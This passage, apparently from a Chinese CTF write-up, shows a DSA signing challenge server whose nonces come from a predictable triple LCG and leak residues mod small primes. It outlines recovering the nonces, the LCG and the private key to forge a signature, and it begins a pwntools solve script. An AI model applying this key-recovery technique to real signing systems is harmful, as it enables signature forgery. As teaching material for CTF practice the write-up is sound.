    <span class="token keyword">def</span> <span class="token function">next</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        new <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>a <span class="token operator">*</span> self<span class="token punctuation">.</span>state<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>b <span class="token operator">*</span> self<span class="token punctuation">.</span>state<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>c <span class="token operator">*</span> self<span class="token punctuation">.</span>state<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>d<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>n
        self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>append<span class="token punctuation">(</span>new<span class="token punctuation">)</span>
        <span class="token keyword">return</span> new

<span class="token keyword">class</span> <span class="token class-name">DSA</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># while True:</span>
            <span class="token comment"># self.q = getPrime(160)</span>
            <span class="token comment"># t = 2 * getPrime(1024 - 160) * self.q</span>
            <span class="token comment"># if isPrime(t + 1):</span>
            <span class="token comment">#    self.p = t + 1</span>
            <span class="token comment">#    break</span>
        self<span class="token punctuation">.</span>p <span class="token operator">=</span> dsa_p
        self<span class="token punctuation">.</span>q <span class="token operator">=</span> dsa_q
        self<span class="token punctuation">.</span>g <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> self<span class="token punctuation">.</span>q<span class="token punctuation">,</span> self<span class="token punctuation">.</span>p<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>x <span class="token operator">=</span> randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>y <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>g<span class="token punctuation">,</span> self<span class="token punctuation">.</span>x<span class="token punctuation">,</span> self<span class="token punctuation">.</span>p<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">sign</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> msg<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">:</span>
        h <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>sha256<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        r <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>g<span class="token punctuation">,</span> k<span class="token punctuation">,</span> self<span class="token punctuation">.</span>p<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>q
        s <span class="token operator">=</span> <span class="token punctuation">(</span>inverse<span class="token punctuation">(</span>k<span class="token punctuation">,</span> self<span class="token punctuation">.</span>q<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>h <span class="token operator">+</span> self<span class="token punctuation">.</span>x <span class="token operator">*</span> r<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>q
        <span class="token keyword">return</span> <span class="token punctuation">(</span>r<span class="token punctuation">,</span> s<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">verify</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> msg<span class="token punctuation">,</span> r<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">&lt;</span> r <span class="token operator">&lt;</span> self<span class="token punctuation">.</span>q <span class="token keyword">and</span> <span class="token number">0</span> <span class="token operator">&lt;</span> s <span class="token operator">&lt;</span> self<span class="token punctuation">.</span>q<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
        h <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>sha256<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        w <span class="token operator">=</span> inverse<span class="token punctuation">(</span>s<span class="token punctuation">,</span> self<span class="token punctuation">.</span>q<span class="token punctuation">)</span>
        u1 <span class="token operator">=</span> <span class="token punctuation">(</span>h <span class="token operator">*</span> w<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>q
        u2 <span class="token operator">=</span> <span class="token punctuation">(</span>r <span class="token operator">*</span> w<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>q
        v <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>g<span class="token punctuation">,</span> u1<span class="token punctuation">,</span> self<span class="token punctuation">.</span>p<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>y<span class="token punctuation">,</span> u2<span class="token punctuation">,</span> self<span class="token punctuation">.</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>p<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>q
        <span class="token keyword">return</span> v <span class="token operator">==</span> r

<span class="token keyword">class</span> <span class="token class-name">Task</span><span class="token punctuation">(</span>socketserver<span class="token punctuation">.</span>BaseRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">_recvall</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        BUFF_SIZE <span class="token operator">=</span> <span class="token number">2048</span>
        data <span class="token operator">=</span> <span class="token string">b''</span>
        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
            part <span class="token operator">=</span> self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>BUFF_SIZE<span class="token punctuation">)</span>
            data <span class="token operator">+=</span> part
            <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>part<span class="token punctuation">)</span> <span class="token operator">&lt;</span> BUFF_SIZE<span class="token punctuation">:</span>
                <span class="token keyword">break</span>
        <span class="token keyword">return</span> data<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> msg<span class="token punctuation">,</span> newline<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> newline<span class="token punctuation">:</span>
            msg <span class="token operator">+=</span> <span class="token string">b'\n'</span>
        self<span class="token punctuation">.</span>request<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">recv</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> prompt<span class="token operator">=</span><span class="token string">b'[-] '</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>prompt<span class="token punctuation">,</span> newline<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>_recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">handle</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        n <span class="token operator">=</span> getPrime<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>
        a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d <span class="token operator">=</span> <span class="token punctuation">[</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
        seed1<span class="token punctuation">,</span> seed2<span class="token punctuation">,</span> seed3 <span class="token operator">=</span> <span class="token punctuation">[</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

        lcg <span class="token operator">=</span> TripleLCG<span class="token punctuation">(</span>seed1<span class="token punctuation">,</span> seed2<span class="token punctuation">,</span> seed3<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span>
        dsa <span class="token operator">=</span> DSA<span class="token punctuation">(</span><span class="token punctuation">)</span>

        self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"Welcome to TGCTF Challenge!\n"</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"p = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>dsa<span class="token punctuation">.</span>p<span class="token punctuation">&#125;</span></span><span class="token string">, q = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>dsa<span class="token punctuation">.</span>q<span class="token punctuation">&#125;</span></span><span class="token string">, g = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>dsa<span class="token punctuation">.</span>g<span class="token punctuation">&#125;</span></span><span class="token string">, y = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>dsa<span class="token punctuation">.</span>y<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        small_primes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">59093</span><span class="token punctuation">,</span> <span class="token number">65371</span><span class="token punctuation">,</span> <span class="token number">37337</span><span class="token punctuation">,</span> <span class="token number">43759</span><span class="token punctuation">,</span> <span class="token number">52859</span><span class="token punctuation">,</span> <span class="token number">39541</span><span class="token punctuation">,</span> <span class="token number">60457</span><span class="token punctuation">,</span> <span class="token number">61469</span><span class="token punctuation">,</span> <span class="token number">43711</span><span class="token punctuation">]</span>
        used_messages <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">for</span> o_v <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"Select challenge parts: 1, 2, 3\n"</span><span class="token punctuation">)</span>
            parts <span class="token operator">=</span> self<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>

            <span class="token keyword">if</span> <span class="token string">'1'</span> <span class="token keyword">in</span> parts<span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"Part 1\n"</span><span class="token punctuation">)</span>
                <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Message </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">&#125;</span></span><span class="token string">: "</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                    msg <span class="token operator">=</span> self<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
                    used_messages<span class="token punctuation">.</span>add<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>
                    k <span class="token operator">=</span> lcg<span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                    r<span class="token punctuation">,</span> s <span class="token operator">=</span> dsa<span class="token punctuation">.</span>sign<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> k<span class="token punctuation">)</span>
                    self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"r = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>r<span class="token punctuation">&#125;</span></span><span class="token string">, ks = </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token punctuation">[</span>k <span class="token operator">%</span> p <span class="token keyword">for</span> p <span class="token keyword">in</span> small_primes<span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

            <span class="token keyword">if</span> <span class="token string">'2'</span> <span class="token keyword">in</span> parts<span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"Part 2\n"</span><span class="token punctuation">)</span>
                <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">307</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    k <span class="token operator">=</span> lcg<span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                    self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Message </span><span class="token interpolation"><span class="token punctuation">&#123;</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">&#125;</span></span><span class="token string">: "</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                    msg <span class="token operator">=</span> self<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
                    k <span class="token operator">=</span> lcg<span class="token punctuation">.</span><span class="token builtin">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> dsa<span class="token punctuation">.</span>q
                    r<span class="token punctuation">,</span> s <span class="token operator">=</span> dsa<span class="token punctuation">.</span>sign<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> k<span class="token punctuation">)</span>
                    self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Signature: r = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>r<span class="token punctuation">&#125;</span></span><span class="token string">, s = </span><span class="token interpolation"><span class="token punctuation">&#123;</span>s<span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                    used_messages<span class="token punctuation">.</span>add<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>

            <span class="token keyword">if</span> <span class="token string">'3'</span> <span class="token keyword">in</span> parts<span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"Part 3\n"</span><span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"Forged message: "</span><span class="token punctuation">)</span>
                final_msg <span class="token operator">=</span> self<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"Forged r: "</span><span class="token punctuation">)</span>
                r <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"Forged s: "</span><span class="token punctuation">)</span>
                s <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

                <span class="token keyword">if</span> final_msg <span class="token keyword">in</span> used_messages<span class="token punctuation">:</span>
                    self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"Message already signed!\n"</span><span class="token punctuation">)</span>
                <span class="token keyword">elif</span> dsa<span class="token punctuation">.</span>verify<span class="token punctuation">(</span>final_msg<span class="token punctuation">,</span> r<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">:</span>
                    self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Good! Your flag: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>flag<span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    self<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b"Invalid signature.\n"</span><span class="token punctuation">)</span></code></pre>

<p>分析代码,给出了一个自定的三重lcg,part1给出12组签名的r,以及一个k与很多素数的模的list</p>
<p>9个素数,每个16位，乘积大于k的128位,所以crt可以恢复出k的值</p>
<p>现在相当于拥有12组k,根据12组k逆向lcg即可</p>
<p>使用Grobner基解同余方程组,即可恢复所有参数,接下来预测k值,p,q,g,y均为已知值,即可计算得到x</p>
<p>然后伪造签名即可</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> sha256

sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"node1.tgctf.woooo.tech"</span><span class="token punctuation">,</span><span class="token number">31104</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>

small_primes <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">59093</span><span class="token punctuation">,</span> <span class="token number">65371</span><span class="token punctuation">,</span> <span class="token number">37337</span><span class="token punctuation">,</span> <span class="token number">43759</span><span class="token punctuation">,</span> <span class="token number">52859</span><span class="token punctuation">,</span> <span class="token number">39541</span><span class="token punctuation">,</span> <span class="token number">60457</span><span class="token punctuation">,</span> <span class="token number">61469</span><span class="token punctuation">,</span> <span class="token number">43711</span><span class="token punctuation">]</span>

<span class="token keyword">class</span> <span class="token class-name">TripleLCG</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> seed1<span class="token punctuation">,</span> seed2<span class="token punctuation">,</span> seed3<span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>state <span class="token operator">=</span> <span class="token punctuation">[</span>seed1<span class="token punctuation">,</span> seed2<span class="token punctuation">,</span> seed3<span class="token punctuation">]</span>
        self<span class="token punctuation">.</span>a <span class="token operator">=</span> a
        self<span class="token punctuation">.</span>b <span class="token operator">=</span> b
        self<span class="token punctuation">.</span>c <span class="token operator">=</span> c
        self<span class="token punctuation">.</span>d <span class="token operator">=</span> d
        self<span class="token punctuation">.</span>n <span class="token operator">=</span> n

    <span class="token keyword">def</span> <span class="token function">next</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        new <span class="token operator">=</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>a <span class="token operator">*</span> self<span class="token punctuation">.</span>state<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>b <span class="token operator">*</span> self<span class="token punctuation">.</span>state<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>c <span class="token operator">*</span> self<span class="token punctuation">.</span>state<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> self<span class="token punctuation">.</span>d<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>n
        self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>append<span class="token punctuation">(</span>new<span class="token punctuation">)</span>
        <span class="token keyword">return</span> new

<span class="token keyword">class</span> <span class="token class-name">DSA</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># while True:</span>
            <span class="token comment"># self.q = getPrime(160)</span>
            <span class="token comment"># t = 2 * getPrime(1024 - 160) * self.q</span>
            <span class="token comment"># if isPrime(t + 1):</span>
            <span class="token comment">#    self.p = t + 1</span>
            <span class="token comment">#    break</span>
        self<span class="token punctuation">.</span>p <span class="token operator">=</span> dsa_p
        self<span class="token punctuation">.</span>q <span class="token operator">=</span> dsa_q
        self<span class="token punctuation">.</span>g <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>self<span class="token punctuation">.</span>p <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">//</span> self<span class="token punctuation">.</span>q<span class="token punctuation">,</span> self<span class="token punctuation">.</span>p<span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>x <span class="token operator">=</span> randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>q <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
        self<span class="token punctuation">.</span>y <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>g<span class="token punctuation">,</span> self<span class="token punctuation">.</span>x<span class="token punctuation">,</span> self<span class="token punctuation">.</span>p<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">sign</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> msg<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">:</span>
        h <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>sha256<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        r <span class="token operator">=</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>g<span class="token punctuation">,</span> k<span class="token punctuation">,</span> self<span class="token punctuation">.</span>p<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>q
        s <span class="token operator">=</span> <span class="token punctuation">(</span>inverse<span class="token punctuation">(</span>k<span class="token punctuation">,</span> self<span class="token punctuation">.</span>q<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token punctuation">(</span>h <span class="token operator">+</span> self<span class="token punctuation">.</span>x <span class="token operator">*</span> r<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>q
        <span class="token keyword">return</span> <span class="token punctuation">(</span>r<span class="token punctuation">,</span> s<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">verify</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> msg<span class="token punctuation">,</span> r<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">&lt;</span> r <span class="token operator">&lt;</span> self<span class="token punctuation">.</span>q <span class="token keyword">and</span> <span class="token number">0</span> <span class="token operator">&lt;</span> s <span class="token operator">&lt;</span> self<span class="token punctuation">.</span>q<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token boolean">False</span>
        h <span class="token operator">=</span> bytes_to_long<span class="token punctuation">(</span>sha256<span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        w <span class="token operator">=</span> inverse<span class="token punctuation">(</span>s<span class="token punctuation">,</span> self<span class="token punctuation">.</span>q<span class="token punctuation">)</span>
        u1 <span class="token operator">=</span> <span class="token punctuation">(</span>h <span class="token operator">*</span> w<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>q
        u2 <span class="token operator">=</span> <span class="token punctuation">(</span>r <span class="token operator">*</span> w<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>q
        v <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token builtin">pow</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>g<span class="token punctuation">,</span> u1<span class="token punctuation">,</span> self<span class="token punctuation">.</span>p<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">pow</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>y<span class="token punctuation">,</span> u2<span class="token punctuation">,</span> self<span class="token punctuation">.</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>p<span class="token punctuation">)</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>q
        <span class="token keyword">return</span> v <span class="token operator">==</span> r
<span class="token comment"># -------------------------------------------------</span>
<span class="token comment"># get pqgy</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'!\n'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'p = '</span><span class="token punctuation">)</span>
p<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b','</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'p = '</span><span class="token punctuation">,</span>p<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'q = '</span><span class="token punctuation">)</span>
q<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b','</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'q = '</span><span class="token punctuation">,</span>q<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'g = '</span><span class="token punctuation">)</span>
g<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b','</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'g = '</span><span class="token punctuation">,</span>g<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'y = '</span><span class="token punctuation">)</span>
